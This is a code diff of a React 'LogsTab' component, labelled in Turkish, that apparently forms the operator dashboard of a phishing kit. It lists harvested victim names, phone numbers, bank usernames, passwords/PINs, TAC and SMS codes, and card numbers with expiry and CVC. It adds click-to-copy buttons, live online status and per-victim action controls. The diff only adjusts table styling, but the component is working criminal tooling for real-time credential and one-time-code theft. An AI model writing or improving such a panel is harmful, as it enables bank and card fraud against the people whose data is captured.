@@ -475,19 +475,19 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
         <div className="overflow-x-auto pb-4">
-          <table className="w-full text-sm text-left border-collapse min-w-[1200px]">
+          <table className="w-full text-sm text-left border-collapse">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="px-5 py-4 font-semibold">ID</th>
-                <th className="px-5 py-4 font-semibold">Ödül</th>
-                <th className="px-5 py-4 font-semibold">İsim</th>
-                <th className="px-5 py-4 font-semibold">Numara</th>
-                <th className="px-5 py-4 font-semibold">Banka</th>
-                <th className="px-5 py-4 font-semibold">SMS</th>
-                <th className="px-5 py-4 font-semibold">Kart</th>
-                <th className="px-5 py-4 font-semibold">Sayfa</th>
-                <th className="px-5 py-4 font-semibold">Durum</th>
-                <th className="px-5 py-4 font-semibold text-right">İşlemler</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">ID</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">Ödül</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">İsim</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">Numara</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">Banka</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">SMS</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">Kart</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">Sayfa</th>
+                <th className="px-3 py-4 font-semibold whitespace-nowrap">Durum</th>
+                <th className="px-3 py-4 font-semibold text-right whitespace-nowrap">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
@@ -534,62 +534,62 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
-                    <td className="px-5 py-4 font-mono text-[11px] opacity-50 uppercase" title={row.id}>{row.id.split('-')[0]}</td>
-                    <td className="px-5 py-4 font-bold text-lg text-[#EB5E28]">
+                    <td className="px-3 py-4 font-mono text-[11px] opacity-50 uppercase whitespace-nowrap" title={row.id}>{row.id.split('-')[0]}</td>
+                    <td className="px-3 py-4 font-bold text-lg text-[#EB5E28] whitespace-nowrap">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
-                    <td className="px-5 py-4">
+                    <td className="px-3 py-4 min-w-[100px]">
                       <div className="font-semibold text-sm cursor-pointer hover:underline opacity-90 transition-opacity group-hover:opacity-100" onClick={() => copyToClipboard(`${fd.firstName || ''} ${fd.lastName || ''}`)}>
                         {fd.firstName || fd.lastName ? `${fd.firstName} ${fd.lastName}` : '-'}
                       </div>
                     </td>
-                    <td className="px-5 py-4">
+                    <td className="px-3 py-4 whitespace-nowrap">
                       <div className="cursor-pointer text-sm hover:underline opacity-80" onClick={() => copyToClipboard(fd.phone)}>
                         {fd.phone || '-'}
                       </div>
                     </td>
-                    <td className="px-5 py-4">
-                      <div className="text-[13px] space-y-1.5">
-                          {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500">{fd.bankName}</div>}
-                          {(fd.username || fd.verfuegernummer) && <div className="flex gap-1.5 items-center"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded">K.Adı</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.username || fd.verfuegernummer) as string)}>{fd.username || fd.verfuegernummer}</span></div>}
-                          {(fd.password || fd.pin) && <div className="flex gap-1.5 items-center"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded">Şifre</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.password || fd.pin) as string)}>{fd.password || fd.pin}</span></div>}
-                          {fd.tacCode && <div className="flex gap-1.5 items-center"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded">TAC</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard(fd.tacCode as string)}>{fd.tacCode}</span></div>}
+                    <td className="px-3 py-4">
+                      <div className="text-[13px] space-y-1.5 max-w-[200px] break-all">
+                          {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
+                          {(fd.username || fd.verfuegernummer) && <div className="flex gap-1.5 items-start"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">K.Adı</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.username || fd.verfuegernummer) as string)}>{fd.username || fd.verfuegernummer}</span></div>}
+                          {(fd.password || fd.pin) && <div className="flex gap-1.5 items-start"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">Şifre</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard((fd.password || fd.pin) as string)}>{fd.password || fd.pin}</span></div>}
+                          {fd.tacCode && <div className="flex gap-1.5 items-start"><span className="opacity-40 text-[10px] font-bold uppercase bg-black/5 dark:bg-white/10 px-1.5 py-0.5 rounded mt-0.5 shrink-0">TAC</span> <span className="cursor-pointer font-medium hover:opacity-70 transition-opacity" onClick={()=>copyToClipboard(fd.tacCode as string)}>{fd.tacCode}</span></div>}
                         </div>
                     </td>
-                    <td className="px-5 py-4">
+                    <td className="px-3 py-4 whitespace-nowrap">
                       <div className="cursor-pointer font-mono tracking-widest text-indigo-500 font-bold text-base hover:underline drop-shadow-sm" onClick={() => copyToClipboard(fd.smsCode)}>
                         {fd.smsCode || '-'}
                       </div>
                     </td>
-                    <td className="px-5 py-4">
-                      <div className="text-[12px] space-y-1.5 font-medium">
-                        {fd.cardNumber && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase">No:</span> <span className="cursor-pointer hover:opacity-70" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
-                        {fd.cardExpiry && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase">SKT:</span> <span>{fd.cardExpiry}</span></div>}
-                        {fd.cardCvc && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase">CVC:</span> <span>{fd.cardCvc}</span></div>}
+                    <td className="px-3 py-4">
+                      <div className="text-[12px] space-y-1.5 font-medium max-w-[160px] break-words">
+                        {fd.cardNumber && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase shrink-0">No:</span> <span className="cursor-pointer hover:opacity-70 truncate" onClick={()=>copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</span></div>}
+                        {fd.cardExpiry && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase shrink-0">SKT:</span> <span>{fd.cardExpiry}</span></div>}
+                        {fd.cardCvc && <div className="flex items-center gap-1.5"><span className="opacity-40 text-[10px] font-bold uppercase shrink-0">CVC:</span> <span>{fd.cardCvc}</span></div>}
                       </div>
                     </td>
-                    <td className="px-5 py-4">
-                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold tracking-wide shadow-sm ${stepColor}`}>
+                    <td className="px-3 py-4 whitespace-nowrap">
+                      <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold tracking-wide shadow-sm whitespace-nowrap inline-block ${stepColor}`}>
                         {stepText}
                       </span>
                     </td>
-                    <td className="px-5 py-4">
+                    <td className="px-3 py-4 whitespace-nowrap">
                       {isOnline ? (
-                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold tracking-widest">
+                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold tracking-widest whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
                           ONLINE
                         </span>
                       ) : (
-                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold tracking-widest">
+                        <span className="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold tracking-widest whitespace-nowrap">
                           <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
                           OFFLINE
                         </span>
                       )}
                     </td>
-                    <td className="px-5 py-4 w-[220px]">
-                      <div className="flex flex-col gap-2 w-[220px] items-end">
+                    <td className="px-3 py-4 whitespace-nowrap">
+                      <div className="flex flex-col gap-2 min-w-[150px] items-end">
                         <select 
-                          className={`w-full rounded-xl border text-xs px-3 py-2 outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                          className={`w-full max-w-[160px] rounded-xl border text-xs px-2 py-2 outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
                           value="" 
                           onChange={(e) => {
                             if (e.target.value) {
